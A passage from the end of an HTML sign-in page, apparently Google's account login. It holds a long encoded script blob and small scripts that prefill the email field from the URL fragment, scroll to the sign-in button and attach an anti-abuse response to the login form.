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');
  </script>
<script nonce="JldCXpHjGFQ0l9VY2eSkHw">
  gaia = window.gaia || {};
  gaia.ps = gaia.ps || {};
  gaia.ps.hasPrefilledIdentifier = false;
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var email = null;
    var form = null;
    if (document.getElementById) {
      email = document.getElementById('Email');
      form = document.getElementById('gaia_loginform');
    }
    if (form && email && (email.value == null || email.value == '')
        && (email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script nonce="JldCXpHjGFQ0l9VY2eSkHw">
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script nonce="JldCXpHjGFQ0l9VY2eSkHw">
  if (gaia.ps.hasPrefilledIdentifier) {
  var form = document.getElementById('gaia_loginform');
  if (form) {
  form.submit();
  }
  }
</script>
<script nonce="JldCXpHjGFQ0l9VY2eSkHw">
  (function(){
  gaia_onLoginSubmit = function() {
  try {
  document.bg.low(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('next');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  </body>
</html>
